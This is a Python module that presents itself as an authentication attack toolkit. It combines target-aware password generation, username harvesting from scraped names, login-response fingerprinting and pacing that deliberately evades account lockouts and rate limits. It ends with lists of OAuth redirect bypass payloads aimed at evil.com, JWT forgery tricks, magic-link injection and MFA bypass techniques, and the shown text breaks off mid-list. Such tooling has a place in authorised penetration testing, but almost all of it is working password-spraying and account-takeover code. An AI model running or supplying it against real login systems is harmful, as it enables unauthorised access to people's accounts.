#!/usr/bin/env python3
"""
Advanced Authentication Testing Module (auth2.py)
=================================================

Intelligent authentication attack toolkit with:
- Target-aware password generation
- Username harvesting/enumeration
- Smart credential pairing
- Response fingerprinting
- Lockout avoidance
- Modern auth attack vectors (OAuth, SAML, JWT, MFA)

Usage:
    from payloads.auth2 import AuthAttacker
    
    attacker = AuthAttacker(target="acme.com")
    attacker.generate_passwords(company="Acme Corp", year=2024)
    
    for cred in attacker.smart_attack():
        result = test_login(cred)
        attacker.record_result(cred, result)
"""

import re
import time
import hashlib
import json
from datetime import datetime, timedelta
from typing import List, Dict, Optional, Tuple, Generator
from dataclasses import dataclass, field
from collections import defaultdict
from enum import Enum
import base64


# ============================================================
# DATA CLASSES
# ============================================================

class AuthResult(Enum):
    """Possible authentication outcomes"""
    SUCCESS = "success"
    FAILURE = "failure"
    LOCKOUT = "lockout"
    CAPTCHA = "captcha"
    MFA_REQUIRED = "mfa_required"
    RATE_LIMITED = "rate_limited"
    INVALID_USER = "invalid_user"
    EXPIRED_PASSWORD = "expired_password"
    UNKNOWN = "unknown"


@dataclass
class Credential:
    """A username/password pair with metadata"""
    username: str
    password: str
    source: str = "manual"          # Where this came from
    priority: int = 5               # 1=highest, 10=lowest
    tags: List[str] = field(default_factory=list)
    
    def __str__(self):
        return f"{self.username}:{self.password}"
    
    def __hash__(self):
        return hash((self.username, self.password))


@dataclass
class AttemptRecord:
    """Record of a login attempt"""
    credential: Credential
    timestamp: datetime
    result: AuthResult
    response_time: float = 0.0
    response_length: int = 0
    notes: str = ""


# ============================================================
# RESPONSE FINGERPRINTING
# ============================================================

class ResponseFingerprinter:
    """
    Analyze responses to determine authentication result.
    
    Learns patterns from baseline responses to detect:
    - Successful logins
    - Failed logins
    - Account lockouts
    - MFA challenges
    - Rate limiting
    """
    
    # Common patterns indicating various states
    SUCCESS_PATTERNS = [
        r'welcome',
        r'dashboard',
        r'logged\s*in',
        r'sign\s*out',
        r'logout',
        r'my\s*account',
        r'profile',
        r'hello,?\s*\w+',
        r'successfully\s*authenticated',
    ]
    
    FAILURE_PATTERNS = [
        r'invalid\s*(username|password|credentials)',
        r'incorrect\s*(username|password)',
        r'authentication\s*failed',
        r'login\s*failed',
        r'wrong\s*password',
        r'user\s*not\s*found',
        r'bad\s*credentials',
        r'try\s*again',
    ]
    
    LOCKOUT_PATTERNS = [
        r'account\s*(locked|disabled|suspended)',
        r'too\s*many\s*(attempts|failures)',
        r'temporarily\s*(locked|blocked)',
        r'try\s*again\s*(later|in\s*\d+)',
        r'locked\s*out',
        r'exceeded\s*(maximum|limit)',
    ]
    
    MFA_PATTERNS = [
        r'(enter|verify)\s*(code|otp|token)',
        r'two[- ]?factor',
        r'2fa',
        r'mfa',
        r'verification\s*code',
        r'authenticator',
        r'sent\s*(a\s*)?(code|link)',
        r'check\s*your\s*(phone|email)',
    ]
    
    CAPTCHA_PATTERNS = [
        r'captcha',
        r'recaptcha',
        r'verify\s*you.*human',
        r'robot',
        r'automated',
        r'hcaptcha',
    ]
    
    RATE_LIMIT_PATTERNS = [
        r'rate\s*limit',
        r'slow\s*down',
        r'too\s*many\s*requests',
        r'throttl',
        r'retry[- ]after',
    ]
    
    USER_ENUM_PATTERNS = {
        # Patterns that indicate user exists vs doesn't exist
        "user_exists": [
            r'incorrect\s*password',
            r'wrong\s*password',
            r'password.*incorrect',
        ],
        "user_not_exists": [
            r'user\s*not\s*found',
            r'no\s*such\s*user',
            r'invalid\s*username',
            r'account\s*does\s*not\s*exist',
            r'unknown\s*user',
        ]
    }
    
    def __init__(self):
        self.baseline_failure: Dict = {}
        self.baseline_success: Dict = {}
        self.learned_patterns: Dict[AuthResult, List[str]] = defaultdict(list)
    
    def set_baseline(self, failure_response: Dict, success_response: Dict = None):
        """
        Set baseline responses for comparison.
        
        Args:
            failure_response: {status_code, body, headers, response_time}
            success_response: Same format (if you have a known-good login)
        """
        self.baseline_failure = failure_response
        if success_response:
            self.baseline_success = success_response
    
    def analyze(self, response: Dict) -> Tuple[AuthResult, float, Dict]:
        """
        Analyze a response and determine the authentication result.
        
        Args:
            response: {status_code, body, headers, response_time, redirect_url}
        
        Returns:
            (AuthResult, confidence 0-1, details dict)
        """
        body = response.get('body', '').lower()
        status = response.get('status_code', 0)
        headers = response.get('headers', {})
        redirect = response.get('redirect_url', '')
        resp_time = response.get('response_time', 0)
        
        details = {
            'status_code': status,
            'response_length': len(body),
            'response_time': resp_time,
            'indicators': [],
        }
        
        # Check for rate limiting first (affects other checks)
        if self._match_patterns(body, self.RATE_LIMIT_PATTERNS):
            details['indicators'].append('rate_limit_message')
            return AuthResult.RATE_LIMITED, 0.9, details
        
        if status == 429:
            details['indicators'].append('status_429')
            return AuthResult.RATE_LIMITED, 0.95, details
        
        # Check for CAPTCHA
        if self._match_patterns(body, self.CAPTCHA_PATTERNS):
            details['indicators'].append('captcha_detected')
            return AuthResult.CAPTCHA, 0.9, details
        
        # Check for lockout
        if self._match_patterns(body, self.LOCKOUT_PATTERNS):
            details['indicators'].append('lockout_message')
            return AuthResult.LOCKOUT, 0.9, details
        
        # Check for MFA
        if self._match_patterns(body, self.MFA_PATTERNS):
            details['indicators'].append('mfa_challenge')
            return AuthResult.MFA_REQUIRED, 0.85, details
        
        # Check for success indicators
        success_score = 0
        
        # Redirect to dashboard/home often indicates success
        if status in [301, 302, 303, 307, 308]:
            if any(p in redirect.lower() for p in ['dashboard', 'home', 'account', 'profile', 'welcome']):
                success_score += 0.4
                details['indicators'].append('success_redirect')
        
        # Success patterns in body
        if self._match_patterns(body, self.SUCCESS_PATTERNS):
            success_score += 0.3
            details['indicators'].append('success_message')
        
        # Set-Cookie with session token often indicates success
        set_cookie = headers.get('set-cookie', '')
        if any(s in set_cookie.lower() for s in ['session', 'token', 'auth', 'jwt']):
            if len(set_cookie) > 50:  # Non-trivial cookie value
                success_score += 0.3
                details['indicators'].append('session_cookie_set')
        
        # Compare with baseline if available
        if self.baseline_failure:
            baseline_len = len(self.baseline_failure.get('body', ''))
            current_len = len(body)
            
            # Significantly different response length often means different outcome
            if abs(current_len - baseline_len) > baseline_len * 0.3:
                success_score += 0.2
                details['indicators'].append('length_differs_from_failure')
        
        if success_score >= 0.5:
            return AuthResult.SUCCESS, min(success_score, 0.95), details
        
        # Check for explicit failure
        if self._match_patterns(body, self.FAILURE_PATTERNS):
            details['indicators'].append('failure_message')
            return AuthResult.FAILURE, 0.9, details
        
        # Check for user enumeration
        if self._match_patterns(body, self.USER_ENUM_PATTERNS['user_not_exists']):
            details['indicators'].append('user_not_found')
            return AuthResult.INVALID_USER, 0.85, details
        
        # Default to failure if nothing else matched
        return AuthResult.FAILURE, 0.5, details
    
    def _match_patterns(self, text: str, patterns: List[str]) -> bool:
        """Check if any pattern matches the text"""
        for pattern in patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        return False
    
    def detect_user_enumeration(self, 
                                valid_user_response: Dict,
                                invalid_user_response: Dict) -> Dict:
        """
        Detect if the application leaks username validity.
        
        Returns dict with enumeration vectors found.
        """
        vectors = []
        
        valid_body = valid_user_response.get('body', '').lower()
        invalid_body = invalid_user_response.get('body', '').lower()
        
        # Different error messages
        if valid_body != invalid_body:
            # Check for telltale patterns
            if self._match_patterns(valid_body, self.USER_ENUM_PATTERNS['user_exists']):
                vectors.append({
                    'type': 'error_message',
                    'detail': 'Different error for valid vs invalid user',
                    'severity': 'high'
                })
        
        # Response length difference
        len_diff = abs(len(valid_body) - len(invalid_body))
        if len_diff > 20:
            vectors.append({
                'type': 'response_length',
                'detail': f'Length differs by {len_diff} bytes',
                'severity': 'medium'
            })
        
        # Response time difference
        valid_time = valid_user_response.get('response_time', 0)
        invalid_time = invalid_user_response.get('response_time', 0)
        time_diff = abs(valid_time - invalid_time)
        
        if time_diff > 0.1:  # 100ms difference
            vectors.append({
                'type': 'timing',
                'detail': f'Response time differs by {time_diff:.3f}s',
                'severity': 'medium'
            })
        
        # Status code difference
        if valid_user_response.get('status_code') != invalid_user_response.get('status_code'):
            vectors.append({
                'type': 'status_code',
                'detail': 'Different status codes',
                'severity': 'high'
            })
        
        return {
            'vulnerable': len(vectors) > 0,
            'vectors': vectors
        }


# ============================================================
# RATE LIMITER / LOCKOUT AVOIDANCE
# ============================================================

class LockoutAvoider:
    """
    Track login attempts and avoid triggering account lockouts.
    
    Features:
    - Per-account attempt tracking
    - Configurable thresholds
    - Automatic cooldown periods
    - Distributed attack pacing
    """
    
    def __init__(self,
                 max_attempts_per_account: int = 3,
                 lockout_window_minutes: int = 15,
                 cooldown_minutes: int = 30,
                 global_rate_per_minute: int = 10):
        """
        Args:
            max_attempts_per_account: Max attempts before cooling down
            lockout_window_minutes: Window to track attempts
            cooldown_minutes: How long to wait after hitting limit
            global_rate_per_minute: Max total attempts per minute
        """
        self.max_attempts = max_attempts_per_account
        self.lockout_window = timedelta(minutes=lockout_window_minutes)
        self.cooldown_period = timedelta(minutes=cooldown_minutes)
        self.global_rate = global_rate_per_minute
        
        # Track attempts: username -> list of timestamps
        self.attempts: Dict[str, List[datetime]] = defaultdict(list)
        
        # Track lockouts: username -> lockout_until
        self.lockouts: Dict[str, datetime] = {}
        
        # Global rate tracking
        self.global_attempts: List[datetime] = []
    
    def can_attempt(self, username: str) -> Tuple[bool, str, float]:
        """
        Check if we can attempt login for this username.
        
        Returns:
            (can_attempt, reason, wait_seconds)
        """
        now = datetime.now()
        
        # Check if account is in cooldown
        if username in self.lockouts:
            if now < self.lockouts[username]:
                wait = (self.lockouts[username] - now).total_seconds()
                return False, f"Account in cooldown", wait
            else:
                del self.lockouts[username]
        
        # Clean old attempts outside window
        cutoff = now - self.lockout_window
        self.attempts[username] = [t for t in self.attempts[username] if t > cutoff]
        
        # Check per-account limit
        if len(self.attempts[username]) >= self.max_attempts:
            # Trigger cooldown
            self.lockouts[username] = now + self.cooldown_period
            wait = self.cooldown_period.total_seconds()
            return False, f"Max attempts ({self.max_attempts}) reached", wait
        
        # Check global rate limit
        minute_ago = now - timedelta(minutes=1)
        self.global_attempts = [t for t in self.global_attempts if t > minute_ago]
        
        if len(self.global_attempts) >= self.global_rate:
            wait = 60 - (now - self.global_attempts[0]).total_seconds()
            return False, "Global rate limit", max(0, wait)
        
        return True, "OK", 0
    
    def record_attempt(self, username: str, result: AuthResult):
        """Record an attempt and adjust tracking based on result"""
        now = datetime.now()
        self.attempts[username].append(now)
        self.global_attempts.append(now)
        
        # If we got locked out, mark it
        if result == AuthResult.LOCKOUT:
            self.lockouts[username] = now + self.cooldown_period * 2  # Double cooldown
        
        # If rate limited globally, pause everything
        if result == AuthResult.RATE_LIMITED:
            # Add cooldown to all recent usernames
            for user in self.attempts.keys():
                self.lockouts[user] = now + timedelta(minutes=5)
    
    def get_next_available(self, usernames: List[str]) -> Tuple[Optional[str], float]:
        """
        Get next username that's safe to attempt.
        
        Returns:
            (username or None, seconds until one is available)
        """
        now = datetime.now()
        min_wait = float('inf')
        
        for username in usernames:
            can, reason, wait = self.can_attempt(username)
            if can:
                return username, 0
            min_wait = min(min_wait, wait)
        
        return None, min_wait
    
    def get_status(self) -> Dict:
        """Get current rate limiter status"""
        now = datetime.now()
        return {
            'accounts_tracked': len(self.attempts),
            'accounts_in_cooldown': len(self.lockouts),
            'global_attempts_last_minute': len([t for t in self.global_attempts 
                                                 if t > now - timedelta(minutes=1)]),
            'cooldowns': {
                user: (lockout - now).total_seconds()
                for user, lockout in self.lockouts.items()
                if lockout > now
            }
        }


# ============================================================
# PASSWORD GENERATOR
# ============================================================

class PasswordGenerator:
    """
    Generate target-aware passwords based on:
    - Company name
    - Location
    - Year/season
    - Common patterns
    - Keyboard walks
    - Leaked password patterns
    """
    
    SEASONS = ['Spring', 'Summer', 'Fall', 'Winter', 'Autumn']
    MONTHS = ['January', 'February', 'March', 'April', 'May', 'June',
              'July', 'August', 'September', 'October', 'November', 'December']
    
    COMMON_SUFFIXES = ['!', '1', '123', '1!', '!1', '@', '#', '1234', '12345', 
                       '!@#', '2024', '2023', '01', '99', '007']
    
    LEET_MAP = {'a': '@', 'e': '3', 'i': '1', 'o': '0', 's': '$', 't': '7'}
    
    KEYBOARD_PATTERNS = [
        'qwerty', 'qwerty123', 'qwertyuiop', 
        'asdfgh', 'asdfghjkl',
        'zxcvbn', 'zxcvbnm',
        '1qaz2wsx', '1qaz2wsx3edc',
        'qazwsx', 'qazwsxedc',
        '!QAZ2wsx', '1qazXSW@',
        'password', 'letmein', 'welcome',
    ]
    
    def __init__(self, company: str = None, domain: str = None):
        self.company = company
        self.domain = domain
        self.custom_words: List[str] = []
    
    def add_custom_words(self, words: List[str]):
        """Add custom words relevant to target (products, locations, etc)"""
        self.custom_words.extend(words)
    
    def generate_company_passwords(self, company: str = None) -> List[Credential]:
        """Generate passwords based on company name"""
        company = company or self.company
        if not company:
            return []
        
        passwords = []
        base_words = [
            company,
            company.lower(),
            company.upper(),
            company.capitalize(),
            company.replace(' ', ''),
            company.replace(' ', '').lower(),
            ''.join(word[0] for word in company.split()),  # Acronym
        ]
        
        for base in base_words:
            passwords.append(Credential(
                username="", password=base,
                source="company_base", priority=3, tags=["company"]
            ))
            
            # Add suffixes
            for suffix in self.COMMON_SUFFIXES:
                passwords.append(Credential(
                    username="", password=f"{base}{suffix}",
                    source="company_suffix", priority=4, tags=["company"]
                ))
            
            # Leet speak
            leet = self._leetify(base)
            if leet != base:
                passwords.append(Credential(
                    username="", password=leet,
                    source="company_leet", priority=5, tags=["company", "leet"]
                ))
        
        return passwords
    
    def generate_seasonal_passwords(self, year: int = None) -> List[Credential]:
        """Generate season/month + year passwords"""
        if year is None:
            year = datetime.now().year
        
        passwords = []
        years = [year, year - 1, year + 1]
        
        for y in years:
            for season in self.SEASONS:
                for fmt in [
                    f"{season}{y}",
                    f"{season}{y}!",
                    f"{season}@{y}",
                    f"{season}{y % 100}",
                    f"{season.lower()}{y}",
                    f"{season}{y % 100}!",
                ]:
                    passwords.append(Credential(
                        username="", password=fmt,
                        source="seasonal", priority=4, tags=["seasonal"]
                    ))
            
            for month in self.MONTHS[:6]:  # First 6 months
                passwords.append(Credential(
                    username="", password=f"{month}{y}",
                    source="seasonal", priority=5, tags=["seasonal"]
                ))
        
        return passwords
    
    def generate_keyboard_passwords(self) -> List[Credential]:
        """Generate keyboard walk patterns"""
        passwords = []
        
        for pattern in self.KEYBOARD_PATTERNS:
            passwords.append(Credential(
                username="", password=pattern,
                source="keyboard", priority=6, tags=["keyboard"]
            ))
            
            # Capitalize first letter
            passwords.append(Credential(
                username="", password=pattern.capitalize(),
                source="keyboard", priority=6, tags=["keyboard"]
            ))
            
            # Add common suffixes
            for suffix in ['!', '1', '123']:
                passwords.append(Credential(
                    username="", password=f"{pattern}{suffix}",
                    source="keyboard", priority=7, tags=["keyboard"]
                ))
        
        return passwords
    
    def generate_from_username(self, username: str) -> List[Credential]:
        """Generate passwords derived from username"""
        passwords = []
        
        # Extract parts
        parts = re.split(r'[._@-]', username)
        name = parts[0] if parts else username
        
        variations = [
            username,
            username + "123",
            username + "1",
            username + "!",
            username + "@123",
            name,
            name + "123",
            name.capitalize() + "123",
            name.capitalize() + "!",
            name + name,
            name[::-1],  # Reversed
        ]
        
        for pwd in variations:
            passwords.append(Credential(
                username=username, password=pwd,
                source="username_derived", priority=2, tags=["username_based"]
            ))
        
        return passwords
    
    def generate_all(self, 
                     company: str = None,
                     year: int = None,
                     include_keyboard: bool = True) -> List[Credential]:
        """Generate all password types"""
        passwords = []
        
        if company or self.company:
            passwords.extend(self.generate_company_passwords(company))
        
        passwords.extend(self.generate_seasonal_passwords(year))
        
        if include_keyboard:
            passwords.extend(self.generate_keyboard_passwords())
        
        # Add custom words
        for word in self.custom_words:
            passwords.append(Credential(
                username="", password=word,
                source="custom", priority=3, tags=["custom"]
            ))
            for suffix in self.COMMON_SUFFIXES[:5]:
                passwords.append(Credential(
                    username="", password=f"{word}{suffix}",
                    source="custom", priority=4, tags=["custom"]
                ))
        
        # Deduplicate by password
        seen = set()
        unique = []
        for cred in passwords:
            if cred.password not in seen:
                seen.add(cred.password)
                unique.append(cred)
        
        # Sort by priority
        unique.sort(key=lambda c: c.priority)
        
        return unique
    
    def _leetify(self, text: str) -> str:
        """Convert text to leet speak"""
        result = text.lower()
        for char, leet in self.LEET_MAP.items():
            result = result.replace(char, leet)
        return result


# ============================================================
# USERNAME HARVESTER
# ============================================================

class UsernameHarvester:
    """
    Generate and harvest usernames for a target.
    
    Sources:
    - Email patterns from domain
    - Common username formats
    - Name combinations
    """
    
    COMMON_USERNAMES = [
        'admin', 'administrator', 'root', 'user', 'test', 'guest',
        'demo', 'support', 'info', 'contact', 'webmaster', 'postmaster',
        'sales', 'marketing', 'hr', 'finance', 'it', 'dev', 'ops',
        'sysadmin', 'manager', 'backup', 'service', 'api',
    ]
    
    COMMON_FIRST_NAMES = [
        'james', 'john', 'robert', 'michael', 'david', 'william', 'richard',
        'joseph', 'thomas', 'charles', 'mary', 'patricia', 'jennifer', 'linda',
        'elizabeth', 'barbara', 'susan', 'jessica', 'sarah', 'karen',
    ]
    
    COMMON_LAST_NAMES = [
        'smith', 'johnson', 'williams', 'brown', 'jones', 'garcia', 'miller',
        'davis', 'rodriguez', 'martinez', 'anderson', 'taylor', 'thomas',
    ]
    
    def __init__(self, domain: str = None):
        self.domain = domain
        self.harvested: List[str] = []
    
    def generate_email_patterns(self, 
                                first_name: str, 
                                last_name: str, 
                                domain: str = None) -> List[str]:
        """Generate common email patterns for a name"""
        domain = domain or self.domain
        if not domain:
            return []
        
        f = first_name.lower()
        l = last_name.lower()
        
        patterns = [
            f"{f}.{l}@{domain}",           # john.smith@
            f"{f}{l}@{domain}",             # johnsmith@
            f"{f[0]}{l}@{domain}",          # jsmith@
            f"{f}{l[0]}@{domain}",          # johns@
            f"{f[0]}.{l}@{domain}",         # j.smith@
            f"{l}.{f}@{domain}",            # smith.john@
            f"{l}{f}@{domain}",             # smithjohn@
            f"{l}{f[0]}@{domain}",          # smithj@
            f"{f}_{l}@{domain}",            # john_smith@
            f"{f}-{l}@{domain}",            # john-smith@
            f"{f}@{domain}",                # john@
            f"{l}@{domain}",                # smith@
        ]
        
        return patterns
    
    def generate_common_usernames(self, domain: str = None) -> List[str]:
        """Generate common generic usernames"""
        domain = domain or self.domain
        
        usernames = list(self.COMMON_USERNAMES)
        
        if domain:
            for user in self.COMMON_USERNAMES:
                usernames.append(f"{user}@{domain}")
        
        return usernames
    
    def generate_name_combinations(self, domain: str = None) -> List[str]:
        """Generate usernames from common name combinations"""
        domain = domain or self.domain
        
        usernames = []
        
        for first in self.COMMON_FIRST_NAMES[:10]:
            for last in self.COMMON_LAST_NAMES[:10]:
                patterns = self.generate_email_patterns(first, last, domain)
                usernames.extend(patterns[:3])  # Top 3 patterns per name
        
        return usernames
    
    def parse_names_from_text(self, text: str) -> List[Tuple[str, str]]:
        """
        Extract potential names from text (e.g., LinkedIn, About pages).
        Returns list of (first_name, last_name) tuples.
        """
        # Simple pattern: Capitalized First Last
        pattern = r'\b([A-Z][a-z]+)\s+([A-Z][a-z]+)\b'
        matches = re.findall(pattern, text)
        
        # Filter out common non-names
        non_names = {'The', 'This', 'That', 'With', 'From', 'About', 'Contact'}
        filtered = [(f, l) for f, l in matches 
                    if f not in non_names and l not in non_names]
        
        return filtered
    
    def generate_from_names(self, names: List[Tuple[str, str]], domain: str = None) -> List[str]:
        """Generate usernames from a list of (first, last) name tuples"""
        domain = domain or self.domain
        usernames = []
        
        for first, last in names:
            patterns = self.generate_email_patterns(first, last, domain)
            usernames.extend(patterns)
        
        return list(set(usernames))  # Dedupe


# ============================================================
# MAIN ATTACKER CLASS
# ============================================================

class AuthAttacker:
    """
    Main authentication attack orchestrator.
    
    Combines all components:
    - Password generation
    - Username harvesting
    - Smart credential pairing
    - Response analysis
    - Lockout avoidance
    """
    
    def __init__(self, 
                 target_domain: str = None,
                 company_name: str = None,
                 max_attempts_per_account: int = 3,
                 global_rate_per_minute: int = 10):
        
        self.domain = target_domain
        self.company = company_name
        
        # Initialize components
        self.password_gen = PasswordGenerator(company_name, target_domain)
        self.username_harvest = UsernameHarvester(target_domain)
        self.fingerprinter = ResponseFingerprinter()
        self.rate_limiter = LockoutAvoider(
            max_attempts_per_account=max_attempts_per_account,
            global_rate_per_minute=global_rate_per_minute
        )
        
        # Storage
        self.usernames: List[str] = []
        self.passwords: List[Credential] = []
        self.credentials: List[Credential] = []
        self.attempts: List[AttemptRecord] = []
        self.successful: List[Credential] = []
        
        # State
        self.user_enumeration_possible = False
        self.mfa_detected = False
    
    def setup(self, 
              company: str = None,
              custom_words: List[str] = None,
              custom_usernames: List[str] = None,
              known_names: List[Tuple[str, str]] = None):
        """
        Initial setup with target information.
        
        Args:
            company: Company name for password generation
            custom_words: Custom words for passwords (products, locations)
            custom_usernames: Known usernames to test
            known_names: List of (first, last) name tuples for username gen
        """
        if company:
            self.company = company
            self.password_gen.company = company
        
        if custom_words:
            self.password_gen.add_custom_words(custom_words)
        
        # Generate usernames
        self.usernames = list(self.username_harvest.generate_common_usernames())
        
        if custom_usernames:
            self.usernames.extend(custom_usernames)
        
        if known_names:
            name_usernames = self.username_harvest.generate_from_names(known_names)
            self.usernames.extend(name_usernames)
        
        # Generate passwords
        self.passwords = self.password_gen.generate_all(company=company)
        
        # Generate credentials
        self._generate_credential_pairs()
        
        print(f"[AuthAttacker] Setup complete:")
        print(f"  - {len(self.usernames)} usernames")
        print(f"  - {len(self.passwords)} passwords")
        print(f"  - {len(self.credentials)} credential pairs")
    
    def _generate_credential_pairs(self):
        """Generate smart username/password pairs"""
        self.credentials = []
        
        # Priority 1: Username-derived passwords
        for username in self.usernames:
            derived = self.password_gen.generate_from_username(username)
            self.credentials.extend(derived)
        
        # Priority 2: Company passwords with all usernames
        company_pwds = [p for p in self.passwords if 'company' in p.tags]
        for username in self.usernames[:20]:  # Top 20 usernames
            for pwd in company_pwds[:10]:  # Top 10 company passwords
                self.credentials.append(Credential(
                    username=username,
                    password=pwd.password,
                    source="company_combo",
                    priority=3,
                    tags=["company"]
                ))
        
        # Priority 3: Seasonal passwords
        seasonal_pwds = [p for p in self.passwords if 'seasonal' in p.tags][:10]
        for username in self.usernames[:10]:
            for pwd in seasonal_pwds:
                self.credentials.append(Credential(
                    username=username,
                    password=pwd.password,
                    source="seasonal_combo",
                    priority=4,
                    tags=["seasonal"]
                ))
        
        # Priority 4: Keyboard patterns (low priority, last resort)
        keyboard_pwds = [p for p in self.passwords if 'keyboard' in p.tags][:5]
        for username in self.usernames[:5]:
            for pwd in keyboard_pwds:
                self.credentials.append(Credential(
                    username=username,
                    password=pwd.password,
                    source="keyboard_combo",
                    priority=6,
                    tags=["keyboard"]
                ))
        
        # Sort by priority
        self.credentials.sort(key=lambda c: c.priority)
        
        # Dedupe
        seen = set()
        unique = []
        for cred in self.credentials:
            key = (cred.username, cred.password)
            if key not in seen:
                seen.add(key)
                unique.append(cred)
        
        self.credentials = unique
    
    def set_baseline(self, failure_response: Dict, success_response: Dict = None):
        """Set baseline responses for fingerprinting"""
        self.fingerprinter.set_baseline(failure_response, success_response)
    
    def get_next_credential(self) -> Optional[Credential]:
        """
        Get next credential to test, respecting rate limits.
        
        Returns None if all tested or rate limited.
        """
        tested = {(a.credential.username, a.credential.password) for a in self.attempts}
        
        for cred in self.credentials:
            key = (cred.username, cred.password)
            if key in tested:
                continue
            
            can_attempt, reason, wait = self.rate_limiter.can_attempt(cred.username)
            
            if can_attempt:
                return cred
            
            # Try next username if this one is rate limited
            continue
        
        return None
    
    def record_attempt(self, 
                       credential: Credential, 
                       response: Dict,
                       response_time: float = 0):
        """
        Record an attempt and analyze the result.
        
        Args:
            credential: The credential tested
            response: {status_code, body, headers, redirect_url}
            response_time: Time taken for request
        """
        response['response_time'] = response_time
        
        # Analyze response
        result, confidence, details = self.fingerprinter.analyze(response)
        
        # Record attempt
        record = AttemptRecord(
            credential=credential,
            timestamp=datetime.now(),
            result=result,
            response_time=response_time,
            response_length=len(response.get('body', '')),
            notes=json.dumps(details)
        )
        self.attempts.append(record)
        
        # Update rate limiter
        self.rate_limiter.record_attempt(credential.username, result)
        
        # Track successes
        if result == AuthResult.SUCCESS:
            self.successful.append(credential)
            print(f"[!] SUCCESS: {credential.username}:{credential.password}")
        
        # Track MFA
        if result == AuthResult.MFA_REQUIRED:
            self.mfa_detected = True
            print(f"[*] MFA detected for: {credential.username}")
        
        return result, confidence, details
    
    def smart_attack(self) -> Generator[Credential, None, None]:
        """
        Generator that yields credentials in smart order.
        
        Respects rate limits and prioritizes likely combinations.
        """
        while True:
            cred = self.get_next_credential()
            if cred is None:
                # Check if we're just rate limited or actually done
                status = self.rate_limiter.get_status()
                if status['accounts_in_cooldown'] > 0:
                    # Wait for shortest cooldown
                    min_wait = min(status['cooldowns'].values()) if status['cooldowns'] else 60
                    print(f"[*] Rate limited. Waiting {min_wait:.0f}s...")
                    time.sleep(min_wait)
                    continue
                else:
                    break  # Actually done
            
            yield cred
    
    def get_stats(self) -> Dict:
        """Get attack statistics"""
        results_count = defaultdict(int)
        for attempt in self.attempts:
            results_count[attempt.result.value] += 1
        
        return {
            'total_credentials': len(self.credentials),
            'attempts_made': len(self.attempts),
            'successful_logins': len(self.successful),
            'results_breakdown': dict(results_count),
            'rate_limiter_status': self.rate_limiter.get_status(),
            'mfa_detected': self.mfa_detected,
            'successful_credentials': [
                f"{c.username}:{c.password}" for c in self.successful
            ]
        }
    
    def export_results(self, filepath: str):
        """Export results to JSON file"""
        data = {
            'target': {
                'domain': self.domain,
                'company': self.company
            },
            'stats': self.get_stats(),
            'successful': [
                {'username': c.username, 'password': c.password}
                for c in self.successful
            ],
            'attempts': [
                {
                    'username': a.credential.username,
                    'password': a.credential.password,
                    'result': a.result.value,
                    'timestamp': a.timestamp.isoformat(),
                    'response_time': a.response_time
                }
                for a in self.attempts
            ]
        }
        
        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)
        
        print(f"[*] Results exported to {filepath}")


# ============================================================
# MODERN AUTH ATTACKS
# ============================================================

class ModernAuthAttacks:
    """
    Attack vectors for modern authentication:
    - OAuth/OIDC
    - SAML
    - JWT
    - Magic Links
    - Passwordless
    """
    
    @staticmethod
    def oauth_redirect_payloads(legitimate_callback: str) -> List[Dict]:
        """Generate OAuth redirect_uri bypass payloads"""
        parsed = legitimate_callback.split('/')
        domain = parsed[2] if len(parsed) > 2 else ''
        
        return [
            {
                'payload': 'https://evil.com/callback',
                'description': 'Direct external redirect'
            },
            {
                'payload': f'https://{domain}.evil.com/callback',
                'description': 'Subdomain of attacker domain'
            },
            {
                'payload': f'https://evil.com/{domain}/callback',
                'description': 'Domain as path'
            },
            {
                'payload': f'{legitimate_callback}@evil.com',
                'description': 'URL authority confusion'
            },
            {
                'payload': f'{legitimate_callback}/../../../evil',
                'description': 'Path traversal'
            },
            {
                'payload': f'{legitimate_callback}%00.evil.com',
                'description': 'Null byte injection'
            },
            {
                'payload': f'{legitimate_callback}?.evil.com',
                'description': 'Query string confusion'
            },
            {
                'payload': f'{legitimate_callback}#.evil.com',
                'description': 'Fragment confusion'
            },
            {
                'payload': legitimate_callback.replace('https://', 'https://evil.com\\@'),
                'description': 'Backslash authority'
            },
        ]
    
    @staticmethod
    def jwt_attacks() -> Dict[str, any]:
        """JWT attack vectors"""
        return {
            'alg_none': {
                'header': {"alg": "none", "typ": "JWT"},
                'description': 'Remove signature verification',
                'test': 'Send token with alg:none and empty signature'
            },
            'alg_confusion': {
                'header': {"alg": "HS256", "typ": "JWT"},
                'description': 'Switch RS256 to HS256, sign with public key',
                'test': 'If server uses RS256, try signing with HS256 using public key as secret'
            },
            'kid_injection': {
                'header': {"alg": "HS256", "typ": "JWT", "kid": "../../dev/null"},
                'description': 'Path traversal in key ID',
                'test': 'Point kid to predictable file'
            },
            'jwk_injection': {
                'header': {"alg": "RS256", "typ": "JWT", "jwk": {}},
                'description': 'Embed malicious key in token',
                'test': 'Include attacker-controlled JWK in header'
            },
            'weak_secrets': [
                'secret', 'password', '123456', 'key', 'private',
                'your-256-bit-secret', 'changeme', '', 'null'
            ]
        }
    
    @staticmethod
    def magic_link_attacks() -> List[Dict]:
        """Magic link/passwordless auth attacks"""
        return [
            {
                'attack': 'Token Prediction',
                'test': 'Check if tokens are sequential or time-based',
                'example': 'token=1001, token=1002...'
            },
            {
                'attack': 'Token Reuse',
                'test': 'Use same magic link multiple times',
                'example': 'Click link, check if still valid'
            },
            {
                'attack': 'Token Non-Expiry',
                'test': 'Use old magic links',
                'example': 'Try links from hours/days ago'
            },
            {
                'attack': 'Host Header Poisoning',
                'test': 'Change Host header in magic link request',
                'example': 'Host: evil.com - link sent to victim has evil.com domain'
            },
            {
                'attack': 'Email Parameter Injection',
                'test': 'Add CC/BCC via email parameter',
                'example': 'email=victim@test.com%0Acc:attacker@evil.com'
            },
        ]
    
    @staticmethod
    def mfa_bypass_techniques() -> List[Dict]:
        """MFA/2FA bypass techniques"""
        return [
            {
                'technique': 'Direct Endpoint Access',
                'description': 'Skip to post-2FA page directly',
                'test': 'After first factor, access /dashboard directly'
            },
            {
                'technique': 'Response Manipulation',
                'description': 'Change 2FA response from failure to success',
                'test': 'Intercept and change {"success":false} to {"success":true}'
            },
            {
                'technique': 'Null/Empty Code',
                'description': 'Submit empty or null OTP',
                'test': 'otp=, otp=null, otp=000000'
            },
            {
                'technique': 'Code Reuse',
                'description': 'Reuse previously valid OTP',
                'test': 'Use old codes that should be expired'
            },
            {
                'technique': 'Backup Code Brute Force',
                'description': 'Brute force backup codes',
                'test': 'Often 8-digit numeric, no rate limit'
            },
            {
                'technique': 'Status Code Check',
